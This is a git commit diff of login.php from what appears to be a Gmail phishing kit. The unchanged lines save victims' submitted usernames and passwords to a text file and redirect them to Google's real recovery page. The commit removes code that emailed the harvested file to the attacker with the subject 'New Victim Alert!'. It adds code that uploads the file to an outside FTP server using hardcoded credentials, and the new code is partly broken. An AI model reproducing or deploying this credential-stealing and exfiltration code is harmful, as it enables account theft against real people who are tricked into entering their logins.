3f84625cf911bbc35c3176c5a2ac04d4dff04508
PhoenixK75 <111184409+PhoenixK75@users.noreply.github.com>
2022-09-27 13:14:02 +0530

    Update login.php

--- login.php
+++ login.php
@@ -2,51 +2,38 @@
 
 file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
-// Recipient 
-$to = 'killerp750@protonmail.com'; 
- 
-// Sender 
-$from = 'hacksvc@phoenixsec.com'; 
-$fromName = 'PhoenixKiller'; 
- 
-// Email subject 
-$subject = 'New Victim Alert!';  
- 
-// Attachment file 
-$file = "usernames.txt"; 
-$headers = "From: $fromName"." <".$from.">"; 
- 
-// Boundary  
-$semi_rand = md5(time());  
-$mime_boundary = "==Multipart_Boundary_x{$semi_rand}x";  
- 
-// Headers for attachment  
-$headers .= "\nMIME-Version: 1.0\n" . "Content-Type: multipart/mixed;\n" . " boundary=\"{$mime_boundary}\""; 
- 
-// Multipart boundary  
-$message = "--{$mime_boundary}\n" . "Content-Type: text/html; charset=\"UTF-8\"\n" . 
-"Content-Transfer-Encoding: 7bit\n\n" . $htmlContent . "\n\n";  
- 
-// Preparing attachment 
-if(!empty($file) > 0){ 
-    if(is_file($file)){ 
-        $message .= "--{$mime_boundary}\n"; 
-        $fp =    @fopen($file,"rb"); 
-        $data =  @fread($fp,filesize($file)); 
- 
-        @fclose($fp); 
-        $data = chunk_split(base64_encode($data)); 
-        $message .= "Content-Type: application/octet-stream; name=\"".basename($file)."\"\n" .  
-        "Content-Description: ".basename($file)."\n" . 
-        "Content-Disposition: attachment;\n" . " filename=\"".basename($file)."\"; size=".filesize($file).";\n" .  
-        "Content-Transfer-Encoding: base64\n\n" . $data . "\n\n"; 
-    } 
-} 
-$message .= "--{$mime_boundary}--"; 
-$returnpath = "-f" . $from; 
- 
-// Send email 
-$mail = @mail($to, $subject, $message, $headers, $returnpath); 
-echo $mail?"<h1>Email Sent Successfully!</h1>":"<h1>Email sending failed.</h1>"; 
+//check if form is submitted
+    // ftp settings
+    $ftp_hostname = 'ftpupload.net'; // change this
+    $ftp_username = 'b12_32676505'; // change this
+    $ftp_password = 'godjesus123S'; // change this
+
+    $src_file = $_FILES['srcfile']['usernames.txt'];
+
+    //upload file
+    if ($src_file!='')
+    {
+        // remote file path
+      
+        
+        // connect ftp
+        $ftpcon = ftp_connect($ftp_hostname) or die('Error connecting to ftp server...');
+        
+        // ftp login
+        $ftplogin = ftp_login($ftpcon, $ftp_username, $ftp_password);
+        
+        // ftp upload
+        if (ftp_put($ftpcon, $src_file, $src_file, FTP_ASCII))
+            echo 'File uploaded successfully to FTP server!';
+        else
+            echo 'Error uploading file! Please try again later.';
+        
+        // close ftp stream
+        ftp_close($ftpcon);
+    }
+    else
+        header('Location: index.php');
+}
+?>
 exit();
 ?>
